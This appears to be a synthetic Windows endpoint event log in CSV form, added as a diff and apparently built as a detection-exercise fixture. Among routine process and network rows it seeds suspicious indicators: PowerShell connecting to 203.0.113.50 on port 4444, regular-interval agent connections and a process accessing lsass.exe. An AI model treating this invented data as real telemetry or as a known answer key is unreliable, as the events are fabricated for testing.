+2026-03-01T10:11:07,WS02,bob,22,C:\Windows\explorer.exe,,,mail.example.org,,,
+2026-03-01T10:11:20,SRV01,alice,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,4192,620
+2026-03-01T10:11:37,WS01,alice,22,C:\Windows\explorer.exe,,,mail.example.org,,,
+2026-03-01T10:11:44,WS01,alice,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,203.0.113.50:4444,,3172,
+2026-03-01T10:12:06,SRV01,bob,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.29.169:443,,4211,
+2026-03-01T10:12:32,WS01,bob,22,C:\Windows\explorer.exe,,,mail.example.org,,,
+2026-03-01T10:12:46,WS01,carol,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,4225,620
+2026-03-01T10:12:51,WS01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4262,4
+2026-03-01T10:13:08,DC01,carol,4624,,,,3,10.0.0.14,,
+2026-03-01T10:13:09,SRV01,alice,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4277,4
+2026-03-01T10:13:29,WS01,alice,3,C:\Program Files\Google\Chrome\Application\chrome.exe,,,142.250.42.91:443,,4298,
+2026-03-01T10:13:52,SRV01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4332,4
+2026-03-01T10:14:10,DC01,alice,4624,,,,3,10.0.0.19,,
+2026-03-01T10:14:24,SRV01,bob,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4348,4
+2026-03-01T10:14:31,WS01,carol,1,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,explorer.exe,,,4380,4
+2026-03-01T10:14:37,WS01,carol,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,svchost.exe -k netsvcs,,,4415,620
+2026-03-01T10:18:14,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:19:38,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:21:03,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:22:27,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:24:15,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:24:39,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:27:06,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:28:29,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:30:33,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:33:28,SRV01,svc_mon,3,C:\Monitoring\agent.exe,,,10.0.0.9:8443,,77,
+2026-03-01T10:33:51,WS01,SYSTEM,10,C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe,,,C:\Windows\System32\lsass.exe,,,
